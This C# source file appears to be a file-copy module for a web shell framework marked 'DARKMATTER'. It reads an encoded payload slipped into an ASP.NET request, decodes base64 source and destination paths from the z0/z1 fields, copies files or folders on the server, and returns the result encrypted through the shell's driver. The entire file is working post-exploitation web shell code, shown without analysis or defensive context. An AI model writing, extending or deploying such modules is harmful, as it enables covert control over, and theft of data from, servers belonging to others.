using System;
using System.Web;
using System.IO;
using System.Diagnostics;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Threading;

public class file_copy
{
    private Dictionary<string, string> fnParseParams(string szParam)
    {
        Dictionary<string, string> dic = new Dictionary<string, string>();
        if (string.IsNullOrEmpty(szParam))
            return dic;

        string[] pairs = szParam.Split('&');
        foreach (string szPair in pairs)
        {
            int nIdx = szPair.IndexOf("=");
            if (nIdx > 0)
                dic[szPair.Substring(0, nIdx).Trim()] = szPair.Substring(nIdx + 1).Trim();
        }

        return dic;
    }

    private string fnB64Encode(string szInput) => Convert.ToBase64String(Encoding.UTF8.GetBytes(szInput));
    private string fnB64Decode(string szInput) => Encoding.UTF8.GetString(Convert.FromBase64String(szInput));

    private void fnWriteOutput(object driver, HttpResponse response, byte[] abOutput)
    {
        if (abOutput.Length == 0)
            abOutput = Encoding.UTF8.GetBytes("DARKMATTER_SUCCESS: Action executed but returned no output");

        byte[] abEncryptedResp = abOutput;
        if (driver != null)
        {
            try
            {
                var cryptMethod = driver.GetType().GetMethod("Crypt", new Type[] { typeof(byte[]), typeof(int) });
                if (cryptMethod != null)
                {
                    abEncryptedResp = (byte[])cryptMethod.Invoke(driver, new object[] { abOutput, 1 });
                }
            }
            catch (Exception) { }
        }

        response.Clear();
        response.ContentType = "application/octet-stream";
        response.StatusCode = 200;
        response.BinaryWrite(abEncryptedResp);
        response.Flush();
    }

    private void fnCopyRecursive(string sourceDir, string targetDir)
    {
        Directory.CreateDirectory(targetDir);

        foreach (string file in Directory.GetFiles(sourceDir))
        {
            string fileName = Path.GetFileName(file);
            string destFile = Path.Combine(targetDir, fileName);
            File.Copy(file, destFile, true);
        }

        foreach (string directory in Directory.GetDirectories(sourceDir))
        {
            string dirName = Path.GetFileName(directory);
            string destDir = Path.Combine(targetDir, dirName);
            fnCopyRecursive(directory, destDir);
        }
    }

    private string fnMain(string szSrcPath, string szDstPath)
    {
        if (!Directory.Exists(szSrcPath) && !File.Exists(szSrcPath))
        {
            return "0|Source does not exist.";
        }
        else if (Directory.Exists(szDstPath) || File.Exists(szDstPath))
        {
            return "0|Destination already exists.";
        }
        else
        {
            try
            {
                FileAttributes attr = File.GetAttributes(szSrcPath);
                if ((attr & FileAttributes.Directory) == FileAttributes.Directory)
                {
                    fnCopyRecursive(szSrcPath, szDstPath);
                }
                else
                {
                    string dstParent = Path.GetDirectoryName(szDstPath);
                    if (!string.IsNullOrEmpty(dstParent) && !Directory.Exists(dstParent))
                    {
                        Directory.CreateDirectory(dstParent);
                    }
                    File.Copy(szSrcPath, szDstPath, true);
                }
                return "1|";
            }
            catch (Exception ex)
            {
                return "0|Error: " + ex.Message;
            }
        }
    }

    public bool Run()
    {
        HttpContext context = HttpContext.Current;
        if (context == null)
            return false;

        HttpRequest request = context.Request;
        HttpResponse response = context.Response;
        object driver = context.Items["driver"];

        try
        {
            byte[] abPayload = (byte[])context.Items["payload"];
            object objLength = context.Items["len"];

            if (abPayload == null || objLength == null)
            {
                response.Write("PAYLOAD_ERROR: Missing attributes from request.");
                return true;
            }

            int nDllLength = Convert.ToInt32(objLength.ToString());
            int nParamOffset = nDllLength + 4;
            int nParamLength = abPayload.Length - nParamOffset;
            string szParam = Encoding.UTF8.GetString(abPayload, nParamOffset, nParamLength).Trim();

            Dictionary<string, string> dic = fnParseParams(szParam);

            string szSrcPath = fnB64Decode(dic["z0"]);
            string szDstPath = fnB64Decode(dic["z1"]);

            string result = fnMain(szSrcPath, szDstPath);
            fnWriteOutput(driver, response, Encoding.UTF8.GetBytes(result));
        }
        catch (Exception ex)
        {
            try
            {
                response.Write("DARKMATTER_INTERNAL_CRASHED: " + ex.ToString());
            }
            catch (Exception) { }
        }

        return true;
    }
}